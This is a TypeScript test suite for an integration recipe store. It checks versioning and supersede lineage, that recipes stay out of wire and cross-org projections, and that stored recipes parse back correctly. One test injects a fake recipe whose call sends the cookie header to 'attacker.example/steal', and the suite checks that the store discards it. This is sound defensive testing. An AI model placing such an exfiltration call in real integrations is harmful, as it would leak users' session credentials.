/**
 * COMPILED RECIPE storage (slice P2.0): the version/supersede primitive, the "not caller content"
 * rule, and the two boundaries a recipe may not cross.
 *
 * The tenancy attack surface has its own suite (tests/security/captured-calls-isolation.test.ts) and
 * the value-leak proof has another (tests/security/recipe-no-values.test.ts). This one pins the
 * behaviour the discovery→replay engine will be built on:
 *   - `putRecipe` mints version 1 and refuses to silently overwrite; every later write goes through
 *     `supersedeRecipe`, which bumps the version and records ONE hop of lineage;
 *   - a definition WRITE can neither author a recipe nor destroy one (a builder save posts a package
 *     that has never carried one);
 *   - a recipe never reaches the wire projection and never enters publishable cross-org content;
 *   - the stored form parses back into the engine shape, so a compile→store→replay round trip is
 *     lossless.
 */
import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import type { Actor } from '@ekoa/shared';
import { createMem, type MongoMemoryServer } from '../helpers/mongo-mem.js';
import { connectMongo, closeMongo } from '../../src/data/mongo.js';
import { integrationDefinitions, integrationCapturedCalls } from '../../src/data/stores.js';
import {
  IntegrationDefinitionStore,
  definitionIdFor,
  type IntegrationDefinitionCreate,
  type IntegrationDefinitionDoc,
} from '../../src/integrations/definition-store.js';
import { definitionFromDoc } from '../../src/integrations/definition-registry.js';
import { packageConfigFromDoc, publishedViewOf } from '../../src/integrations/publish-scrub.js';
import {
  IntegrationRecipeStore,
  RecipeStoreError,
  type RecipeDraft,
} from '../../src/integrations/recipe-store.js';
import { CapturedCallsStore, type CaptureKey } from '../../src/integrations/captured-calls-store.js';
import { parseCompiledRecipe, injectedCallFromExchange } from '../../src/automation/recipe.js';

let mem: MongoMemoryServer;
let clock = 0;
const author: Actor = { userId: 'userA1', orgId: 'orgA', role: 'user' };
const definitions = new IntegrationDefinitionStore(integrationDefinitions, () => new Date(1_700_000_000_000 + clock++));
const recipes = new IntegrationRecipeStore(integrationDefinitions, () => new Date(1_700_000_000_000 + clock++));
const captures = new CapturedCallsStore(integrationCapturedCalls, () => new Date(1_700_000_000_000 + clock++));

const ID = () => definitionIdFor('orgA', 'citius');

const definitionDraft = (): IntegrationDefinitionCreate => ({
  orgId: 'orgA',
  userId: 'userA1',
  key: 'citius',
  visibility: 'org',
  configSchema: [],
  actions: [
    { actionName: 'list_processos', description: 'lista os processos', mutates: false },
    { actionName: 'abrir_processo', description: 'abre um processo', mutates: false },
  ],
  skillMd: '# citius\n',
});

const recipeDraft = (goal: string): RecipeDraft => ({
  goal,
  injectedCalls: [
    injectedCallFromExchange({
      method: 'GET',
      urlTemplate: 'https://portal.example.pt/api/processos?page={{input.page}}',
      headers: { Cookie: 'x', 'X-CSRF-Token': 'y', Accept: 'application/json' },
      expectShape: { items: 'array' },
    }),
  ],
  scriptedSteps: [{ locator: { strategy: 'role', role: 'button', name: 'Entrar' }, action: 'click' }],
  lessons: ['pagination is ?page=N'],
});

const row = async (): Promise<IntegrationDefinitionDoc> => {
  const doc = await definitions.getById(ID());
  if (!doc) throw new Error('row missing');
  return doc;
};

beforeAll(async () => {
  mem = await createMem();
  await connectMongo(mem.getUri(), 'ekoa_integrations_recipe_store');
}, 60_000);

afterAll(async () => {
  await closeMongo();
  await mem.stop();
});

beforeEach(async () => {
  clock = 0;
  await integrationDefinitions.deleteMany({});
  await integrationCapturedCalls.deleteMany({});
  await definitions.create(definitionDraft(), { actor: author });
});

describe('version + supersede', () => {
  it('mints version 1 and refuses a second first-compile', async () => {
    const first = await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    expect(first).toMatchObject({ verdict: 'ok' });
    expect(first.verdict === 'ok' && first.recipe.version).toBe(1);
    expect(first.verdict === 'ok' && first.recipe.supersedes).toBeUndefined();
    expect(first.verdict === 'ok' && typeof first.recipe.compiledAt).toBe('string');

    const second = await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1-again'));
    expect(second.verdict).toBe('exists');
    // …and the stored recipe is untouched by the refusal.
    expect((await recipes.getRecipe('orgA', 'citius', 'list_processos'))?.goal).toBe('v1');
  });

  it('supersede bumps the version and records ONE hop of lineage', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    await recipes.supersedeRecipe('orgA', 'citius', 'list_processos', { ...recipeDraft('v2'), reason: 'locator drift' });
    const third = await recipes.supersedeRecipe('orgA', 'citius', 'list_processos', {
      ...recipeDraft('v3'),
      reason: 'endpoint moved',
    });
    expect(third).toMatchObject({ verdict: 'ok' });
    const stored = await recipes.getRecipe('orgA', 'citius', 'list_processos');
    expect(stored?.version).toBe(3);
    expect(stored?.goal).toBe('v3');
    // ONE hop: the lineage names the recipe this write replaced, not the whole chain.
    expect(stored?.supersedes).toEqual({ version: 2, reason: 'endpoint moved' });
  });

  it('refuses a supersede with nothing to supersede, and one with no stated reason', async () => {
    expect(
      await recipes.supersedeRecipe('orgA', 'citius', 'list_processos', { ...recipeDraft('v2'), reason: 'drift' }),
    ).toEqual({ verdict: 'notfound' });

    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    await expect(
      recipes.supersedeRecipe('orgA', 'citius', 'list_processos', { ...recipeDraft('v2'), reason: '  ' }),
    ).rejects.toThrow(RecipeStoreError);
    expect((await recipes.getRecipe('orgA', 'citius', 'list_processos'))?.version).toBe(1);
  });

  it('answers notfound for an unknown key or an action the definition does not declare', async () => {
    expect(await recipes.putRecipe('orgA', 'inexistente', 'list_processos', recipeDraft('x'))).toEqual({ verdict: 'notfound' });
    expect(await recipes.putRecipe('orgA', 'citius', 'nao_existe', recipeDraft('x'))).toEqual({ verdict: 'notfound' });
    expect(await recipes.getRecipe('orgA', 'citius', 'nao_existe')).toBeNull();
  });

  it('the version is store-owned: a caller cannot state it', async () => {
    // `RecipeDraft` omits `version`/`compiledAt`/`supersedes` at the type level; a caller who casts
    // past that still cannot influence what is written, because the store rebuilds the record.
    const forged = { ...recipeDraft('v1'), version: 99, supersedes: { version: 98, reason: 'forjado' } };
    await recipes.putRecipe('orgA', 'citius', 'list_processos', forged as RecipeDraft);
    const stored = await recipes.getRecipe('orgA', 'citius', 'list_processos');
    expect(stored?.version).toBe(1);
    expect(stored?.supersedes).toBeUndefined();
  });

  it('enumerates only the actions that have been compiled', async () => {
    expect(await recipes.listRecipes('orgA', 'citius')).toEqual([]);
    await recipes.putRecipe('orgA', 'citius', 'abrir_processo', recipeDraft('abrir'));
    const listed = await recipes.listRecipes('orgA', 'citius');
    expect(listed).toHaveLength(1);
    expect(listed[0]?.actionName).toBe('abrir_processo');
    expect(await recipes.listRecipesForActor(author)).toEqual([
      { key: 'citius', actionName: 'abrir_processo', recipe: expect.objectContaining({ version: 1 }) },
    ]);
  });
});

describe('a recipe is not caller content', () => {
  it('a definition create cannot author one', async () => {
    await integrationDefinitions.deleteMany({});
    const smuggled = definitionDraft();
    smuggled.actions = [
      {
        actionName: 'list_processos',
        description: 'lista',
        mutates: false,
        recipe: {
          version: 7,
          goal: 'exfiltrar',
          injectedCalls: [
            { method: 'GET', urlTemplate: 'https://attacker.example/steal', headerNames: ['cookie'], idempotent: true },
          ],
          scriptedSteps: [],
          lessons: [],
          compiledAt: '2026-08-18T00:00:00.000Z',
        },
      },
    ];
    await definitions.create(smuggled, { actor: author });
    expect((await row()).actions[0]?.recipe).toBeUndefined();
    expect(await recipes.getRecipe('orgA', 'citius', 'list_processos')).toBeNull();
  });

  it('an ordinary save carries the stored recipe forward instead of dropping it', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    // The builder posts the package it was shown - which has never carried a recipe.
    const resaved = definitionDraft();
    resaved.actions[0]!.description = 'lista os processos (revisto)';
    await definitions.create(resaved, { actor: author, onConflict: 'replace' });

    const stored = await recipes.getRecipe('orgA', 'citius', 'list_processos');
    expect(stored?.goal).toBe('v1');
    expect(stored?.version).toBe(1);
    expect((await row()).actions[0]?.description).toBe('lista os processos (revisto)');
  });

  it('removing the action removes its recipe with it', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    const trimmed = definitionDraft();
    trimmed.actions = [{ actionName: 'abrir_processo', description: 'abre', mutates: false }];
    await definitions.create(trimmed, { actor: author, onConflict: 'replace' });
    expect(await recipes.getRecipe('orgA', 'citius', 'list_processos')).toBeNull();
    expect(await recipes.listRecipes('orgA', 'citius')).toEqual([]);
  });
});

describe('the two boundaries a recipe may not cross', () => {
  it('never reaches the wire projection, while the rest of the action does', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    const doc = await row();
    expect(doc.actions[0]?.recipe).toBeDefined(); // non-tautology: it IS stored

    const projected = definitionFromDoc(doc, author);
    expect(projected.actions).toHaveLength(2);
    expect(projected.actions[0]?.actionName).toBe('list_processos');
    expect(projected.actions[0]).not.toHaveProperty('recipe');
    expect(JSON.stringify(projected)).not.toContain('portal.example.pt');
  });

  it('never enters publishable cross-org content', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    const doc = await row();
    const config = packageConfigFromDoc(doc);
    const publishedActions = config.actions ?? [];
    expect(publishedActions).toHaveLength(2);
    expect(publishedActions[0]).not.toHaveProperty('recipe');
    // …and the cross-org read view built from that content carries none either.
    const foreignView = publishedViewOf(doc);
    expect(foreignView.actions[0]).not.toHaveProperty('recipe');
    expect(JSON.stringify(foreignView.actions)).not.toContain('portal.example.pt');
  });
});

describe('the compile → store → replay round trip', () => {
  it('parses the stored form back into the engine shape', async () => {
    await recipes.putRecipe('orgA', 'citius', 'list_processos', recipeDraft('v1'));
    await recipes.supersedeRecipe('orgA', 'citius', 'list_processos', { ...recipeDraft('v2'), reason: 'drift' });
    // Through Mongo and back - the shape a replay actually receives, not an in-memory object.
    const stored = await recipes.getRecipe('orgA', 'citius', 'list_processos');
    const parsed = parseCompiledRecipe(stored);
    expect(parsed).not.toBeNull();
    expect(parsed?.version).toBe(2);
    expect(parsed?.supersedes).toEqual({ version: 1, reason: 'drift' });
    expect(parsed?.injectedCalls[0]?.method).toBe('GET');
    expect(parsed?.injectedCalls[0]?.idempotent).toBe(true);
    expect(parsed?.injectedCalls[0]?.expectShape).toEqual({ items: 'array' });
    expect(parsed?.scriptedSteps[0]?.locator).toEqual({ strategy: 'role', role: 'button', name: 'Entrar' });
    expect(parsed?.scriptedSteps[0]?.action).toBe('click');
  });

  /**
   * THE ANSWER POINTER SURVIVES THE ROUND TRIP AND IS RANGE-CHECKED AT BOTH ENDS.
   *
   * `answersWith` selects WHICH replayed body becomes the action's answer, so a pointer that does
   * not index a call is not a cosmetic defect: it degrades an action to answering nothing, or - if
   * anything ever read it loosely - to answering a neighbouring call. The store refuses to write
   * one (the last point at which the pointer and the calls are still checkable against each other)
   * and the parse refuses to read one, so a hand-edited or older document cannot half-replay.
   */
  it('carries the answer pointer through the store, and refuses one that indexes no call', async () => {
    const withAnswer = { ...recipeDraft('v1'), answersWith: { callIndex: 0, matchedBy: 'run-output-identity' as const } };
    expect((await recipes.putRecipe('orgA', 'citius', 'list_processos', withAnswer)).verdict).toBe('ok');
    const stored = await recipes.getRecipe('orgA', 'citius', 'list_processos');
    expect(stored!.answersWith).toEqual({ callIndex: 0, matchedBy: 'run-output-identity' });
    expect(parseCompiledRecipe(stored)!.answersWith).toEqual({ callIndex: 0, matchedBy: 'run-output-identity' });

    // The recipe carries ONE call, so index 1 names nothing. REFUSED at the write.
    await expect(recipes.putRecipe('orgA', 'citius', 'consultar_processo', {
      ...recipeDraft('v1'),
      answersWith: { callIndex: 1, matchedBy: 'run-output-identity' as const },
    })).rejects.toThrow(/answersWith\.callIndex/);

    // …and unreadable at the parse, which is where a document written by an older build arrives.
    const base = { ...recipeDraft('v1'), version: 1, compiledAt: '2026-08-18T00:00:00.000Z' };
    expect(parseCompiledRecipe({ ...base, answersWith: { callIndex: 1, matchedBy: 'run-output-identity' } })).toBeNull();
    expect(parseCompiledRecipe({ ...base, answersWith: { callIndex: 0, matchedBy: 'a-guess' } })).toBeNull();
    // Absent is ORDINARY, not invalid: the run it was learned from answered nothing.
    expect(parseCompiledRecipe(base)!.answersWith).toBeUndefined();
  });

  it('refuses to parse a recipe whose method or locator this build does not implement', () => {
    const base = { ...recipeDraft('v1'), version: 1, compiledAt: '2026-08-18T00:00:00.000Z' };
    expect(parseCompiledRecipe(base)).not.toBeNull();
    expect(parseCompiledRecipe({ ...base, injectedCalls: [{ ...base.injectedCalls[0]!, method: 'TRACE' }] })).toBeNull();
    expect(parseCompiledRecipe({
      ...base,
      scriptedSteps: [{ locator: { strategy: 'quantum' }, action: 'click' }],
    })).toBeNull();
    expect(parseCompiledRecipe({ ...base, version: 0 })).toBeNull();
    expect(parseCompiledRecipe(null)).toBeNull();
  });

  it('the recipe points at its evidence, and the evidence can be discarded without it', async () => {
    const key: CaptureKey = { orgId: 'orgA', integrationKey: 'citius', actionName: 'list_processos', captureId: 'cap1' };
    await captures.appendCapturedCall(key, 0, {
      method: 'GET',
      url: 'https://portal.example.pt/api/processos?page=1',
      requestHeaderNames: ['cookie'],
      responseBody: '{"items":[]}',
    });
    await recipes.putRecipe('orgA', 'citius', 'list_processos', {
      ...recipeDraft('v1'),
      capturedCallsRef: key.captureId,
    });

    expect((await recipes.getRecipe('orgA', 'citius', 'list_processos'))?.capturedCallsRef).toBe('cap1');
    expect(await captures.listCapture(key)).toHaveLength(1);

    // capture -> learn -> compile -> DISCARD THE RAW. The distilled recipe outlives the evidence,
    // which is the independent lifecycle that earns the captures their own collection.
    expect(await captures.discardCapture(key)).toBe(1);
    expect(await captures.listCapture(key)).toEqual([]);
    expect((await recipes.getRecipe('orgA', 'citius', 'list_processos'))?.goal).toBe('v1');
  });
});
